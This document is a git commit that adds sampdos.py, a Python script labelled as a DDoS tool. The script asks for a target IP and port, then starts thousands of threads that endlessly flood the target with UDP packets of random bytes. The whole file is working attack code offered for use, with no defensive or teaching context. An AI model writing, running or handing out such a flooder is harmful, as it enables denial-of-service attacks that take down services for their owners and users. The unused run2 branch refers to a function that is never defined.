fa0699144e2f70a2b1d9052f5ca66253969585c1
INTERMELON <90531038+INTERMELON@users.noreply.github.com>
2021-09-12 05:11:29 +0800

    Add files via upload

---
+++ sampdos.py
@@ -0,0 +1,31 @@
+import random
+import socket
+import threading
+
+print('''
+	DDOS TOOL BY HAZIQ JK''')
+ip = str(input(" Target Ip:"))
+port = int(input(" Target Port:"))
+choice = "y"
+times = int(60048)
+threads = int(9999)
+def run():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Sent!!!")
+		except:
+			print("[!] Error!!!")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
